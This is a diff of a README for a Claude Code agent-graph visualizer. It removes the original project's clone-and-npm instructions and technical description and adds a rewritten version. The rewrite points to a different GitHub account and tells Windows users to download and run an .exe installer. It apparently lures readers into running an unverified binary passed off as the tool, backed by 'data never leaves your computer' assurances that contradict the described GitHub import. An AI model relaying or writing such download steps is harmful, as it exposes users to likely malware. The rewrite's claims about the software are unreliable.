@@ -1,100 +1,82 @@
-# Claude Code Flow Visualizer — See Your Entire Agent Harness as an Interactive Graph
+# 🗺️ claude-code-flow-visualizer - See your AI agent workflows clearly
 
-**Visualize any Claude Code configuration (`CLAUDE.md`, subagents, skills, slash commands, hooks, MCP servers, schedulers) as one interactive flow diagram — straight from a GitHub URL, a ZIP, or a local folder. No install for your target repo, no backend, 100% client-side.**
+[![](https://img.shields.io/badge/Download_Application-Blue?style=for-the-badge&logo=github)](https://github.com/Edina3459/claude-code-flow-visualizer)
 
-![Claude Code agent harness visualized as an interactive flow graph](docs/harness-visualization.png)
+## 📖 About this application
 
-## Why
+The claude-code-flow-visualizer helps you understand how your AI agents work. These agents often have complex structures involving many files, instructions, and tools. When you use Claude Code, the system creates rules in files like CLAUDE.md. It also connects to subagents, specific skills, and external servers. Keeping track of these connections is difficult.
 
-Claude Code agent setups live as scattered markdown files: `CLAUDE.md`, `.claude/agents/*.md`, `.claude/skills/*/SKILL.md`, commands, `settings.json` hooks, and `.mcp.json` connectors. To understand how an existing harness works — which agent delegates to which, what skills fire when, where Notion/database/MCP connections plug in — you'd normally have to open and read every single file.
+This tool builds a visual map of your setup. It shows how your commands, hooks, and MCP servers link together. You see the full structure of your project on a screen. This map helps you find errors, check your logic, and see which parts of your agent work together.
 
-This tool parses the whole project and renders it as a wired graph in seconds:
+It runs locally on your machine. Your data never leaves your computer. This keeps your agent instructions and project files private. You do not need a server or a cloud account to use this visualizer.
 
-- 🤖 **Agents** with model + tool badges, delegation edges traced from prompt bodies
-- 📚 **Skills** attached to the agents and commands that actually reference them
-- ⌨️ **Slash commands**, 🪝 **lifecycle hooks**, ⏰ **schedulers** (GitHub Actions / cron)
-- 🔌 **MCP connectors** and 🗄️ **memory / state stores** drawn as distinct node types
-- 🚨 **Pipeline lints**: broken delegation references, duplicate agent names, circular delegation, orphan skills, reviewers with write access, orchestrators missing the `Task` tool, vague trigger descriptions
+## 💻 System requirements
 
-## Quick Start
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 4 gigabytes of RAM or more.
+*   Storage: 200 megabytes of free space.
+*   Connection: An internet connection for downloading the setup file.
 
-```bash
-git clone https://github.com/oyekamal/claude-code-flow-visualizer.git
-cd claude-code-flow-visualizer
-npm install
-npm run dev        # → http://localhost:5173
-```
+## 📥 How to get started
 
-Then either:
+Follow these steps to set up the visualizer on your computer.
 
-1. **Paste a GitHub repo** (`owner/repo`, full URL, or a `/tree/branch/subfolder` link) and hit **VISUALIZE**
-2. **Upload a ZIP** (GitHub → Code → Download ZIP) — fully offline
-3. **Upload a folder** — point it at any local clone
-4. Or click **LOAD DEMO HARNESS** to explore a sample multi-agent content pipeline
+1. Visit the [official download page link](https://github.com/Edina3459/claude-code-flow-visualizer).
+2. Look for the file ending in .exe.
+3. Click the file to start the download.
+4. Save the file to your desktop or downloads folder.
+5. Double-click the file to begin the installation.
+6. Follow the prompts on the screen to finish the setup.
+7. Open the application from your start menu or desktop icon.
 
-![Start screen — import a Claude Code repo from GitHub, ZIP, or local folder](docs/empty-state.png)
+## 🛠️ How to use the visualizer
 
-## Features
+Once you launch the app, you see a clean interface. Follow these steps to map your project:
 
-### Interactive canvas
+1. Select your project source. You can pick an entire folder on your drive, a zip file, or a direct link from GitHub.
+2. Click the Load button.
+3. Wait for the app to scan your files. It reads your CLAUDE.md file and configuration settings.
+4. View the resulting graph. The nodes represent your subagents, skills, and tools. The lines represent the flow of commands.
+5. Use your mouse to drag pieces of the map. This helps you organize the view. 
+6. Click any node to see details about that part of your agent.
 
-Pan, zoom, and drag nodes. Hover or select any node to highlight its wiring. Edge styles encode meaning: solid = delegation, dashed = skill use, dotted = MCP connection, dash-dot = state reads/writes, animated = scheduled loop.
+## 🔍 Features
 
-![Multi-agent orchestrator pipeline rendered with delegation, skill, and MCP edges](docs/demo-graph.png)
+### Interactive Mapping
+The tool creates a real-time graph. You zoom in and out to see details. This clarifies how complex agent loops function.
 
-### Node inspector with raw source
+### Local Privacy
+Security stays within your network. Because the app process occurs on your computer, your proprietary AI instructions remain safe.
 
-Click any agent, skill, command, hook, or connector to see its description trigger, model, tools, incoming/outgoing references — and the underlying markdown file, side by side.
+### Flexible Input
+You bring the data in different ways. If you share a repo link, the app pulls the structure. If you work on a local folder, it scans the files instantly.
 
-![Node inspector showing an agent's tools, delegations, and raw markdown source](docs/node-inspector.png)
+### Component Breakdown
+The app highlights key parts of your setup:
+*   Subagents: See which agents perform specific tasks.
+*   MCP Servers: Check your tool connections.
+*   Hooks: Track how events trigger agent actions.
+*   Commands: Review available prompts and instructions.
 
-### Pipeline lints ("don't break my harness")
+## ❓ Frequently asked questions
 
-The validator catches the ways multi-agent pipelines actually break:
+**Does this tool send my code to the cloud?**
+No. All processing happens inside the application on your computer. No data goes to external servers.
 
-| Check | Level |
-|---|---|
-| Delegation to an agent/skill that doesn't exist | error |
-| Orchestrator delegates but lacks the `Task` tool | error |
-| Duplicate agent names (later file shadows earlier) | warn |
-| Circular delegation loops | warn |
-| Reviewer/validator agents holding write tools | warn |
-| Skills never referenced by anything (dead weight) | warn |
-| Missing or vague descriptions (agents never auto-trigger) | warn/info |
-| MCP servers configured but never used | info |
+**What happens if my agent structure is very large?**
+The visualizer uses a layout engine designed for large graphs. If you have many hundreds of nodes, the app keeps the view responsive by clustering items.
 
-### Three import transports
+**Can I export the graph?**
+Yes. You can save your visualization as an image file. This helps when you want to share your project structure with your team.
 
-1. **GitHub API + raw.githubusercontent** (supports private repos via token)
-2. **jsDelivr mirror** — no rate limits for public repos
-3. **Claude API relay** — works even inside sandboxed previews where only `api.anthropic.com` is reachable
+**Is this safe for commercial projects?**
+Yes. Since the software runs offline, your project secrets do not leave your disk.
 
-Unparseable content is never dropped — it's counted and preserved verbatim.
+## 🧩 Support
 
-## How it works
+If you run into trouble, check the following:
+*   Make sure you have read and write permissions in the folder you are scanning.
+*   Verify that your CLAUDE.md file follows standard formatting.
+*   Ensure your Windows version is up to date.
 
-`files → parser → project model → graph builder → layered layout → SVG canvas`. A single React component (~1,700 lines, no graph library): minimal YAML-frontmatter parser, path classifier for the `.claude` contract, reference extraction from prompt bodies (backticked names, `@mentions`, delegation verbs), BFS-layered layout with barycenter ordering, and a lint pass over the resulting graph.
-
-## Testing
-
-End-to-end tested with Playwright (`test_e2e.py`): empty state, demo graph, inspector, lint panel, live GitHub import, ZIP import.
-
-```bash
-python3 -m venv .venv && .venv/bin/pip install playwright && .venv/bin/playwright install chromium
-npm run dev &
-.venv/bin/python test_e2e.py
-```
-
-## Roadmap
-
-- Canvas → files: edit nodes in the UI and regenerate valid markdown (two-way sync)
-- Impact analysis + diff preview before writing changes back
-- Pre-built agent/skill library and flow templates (orchestrator→workers, builder+validator, scheduled loop with memory)
-
-## Keywords
-
-Claude Code visualizer · CLAUDE.md viewer · Claude subagents graph · `.claude` directory explorer · AI agent orchestration diagram · multi-agent pipeline visualization · MCP server map · agent harness debugging · Anthropic Claude agents
-
-## License
-
-MIT © [oyekamal](https://github.com/oyekamal)
+Keywords: agent-orchestration, ai-agents, anthropic, claude, claude-code, developer-tools, mcp, multi-agent, react, visualization
